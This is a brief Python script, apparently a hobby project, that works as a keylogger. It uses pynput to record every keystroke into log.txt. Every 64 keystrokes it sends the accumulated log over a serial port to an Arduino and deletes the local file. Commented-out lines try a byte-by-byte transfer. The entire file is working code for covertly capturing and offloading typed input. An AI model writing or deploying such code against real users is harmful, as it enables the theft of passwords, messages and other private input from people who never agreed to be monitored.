import pynput
from pynput.keyboard import Key, Listener
import serial
import os
arduinoData = serial.Serial('COM10',9600)
count = 0
keys = []
sender = 0
reader = 0
def on_press(key):
   global keys, count, sender
   keys.append(key)
   count+=1
   sender+=1
   print("{0} pressed".format(key))
   write_file(key)
   if sender == 64:
      while sender > 0:
         r = open("log.txt", "r")
         reader = r.read()
         print(reader)
         arduinoData.write(reader.encode())
         r.close()
         if os.path.exists('log.txt'):
            os.remove('log.txt')
         else:
            print('404 not found')
         sender = 0;
def write_file(key):
   with open("log.txt", "a")as f:
      k = str(key).replace("'","")
      if k.find("space") > 0:
         f.write(' ')
      elif k.find("Key") == -1:
         f.write(k)
def on_release(key):
   if key == Key.esc:
      return False
with Listener(on_press=on_press, on_release=on_release) as Listener:
   Listener.join()
   #r = open("log.txt","r")
   #reader = r.read()
   #for letter in reader:
      #cheg = ord(letter)
      #print(cheg)
      #cheg = cheg.encode()
      #arduinoData.write(cheg)
   #reader = ord(reader)
   #print(reader)
   #reader = bin(reader)[2:].zfill(8)